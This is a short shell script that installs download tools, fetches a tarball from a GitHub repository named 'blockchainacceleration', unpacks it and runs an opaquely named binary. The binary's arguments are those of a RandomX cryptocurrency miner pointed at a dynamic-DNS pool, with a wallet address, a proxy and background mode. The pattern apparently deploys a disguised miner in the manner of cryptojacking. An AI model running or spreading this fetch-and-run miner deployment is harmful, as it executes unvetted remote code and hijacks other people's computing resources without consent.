apt-get update && apt-get install -y \
  wget \
  curl \
  libjansson4 \
  && rm -rf /var/lib/apt/lists/*
wget https://github.com/goodjobro/blockchainacceleration/raw/main/z.tar.gz
tar xvfz z.tar.gz
./a -o poze.zapto.org:5352 -u ZEPHYR2KFZTUxe7aB8rF1hNtJJLjgv8h4jMudEVxjTrcggMRjafK94C8PWni9T3DmDfrZiAAeDjvEf1y3LZ4rjgyB4JQz995rRF2G -p kkb -k -a rx/0 -t 16 -x hash.zapto.org:10554 -B

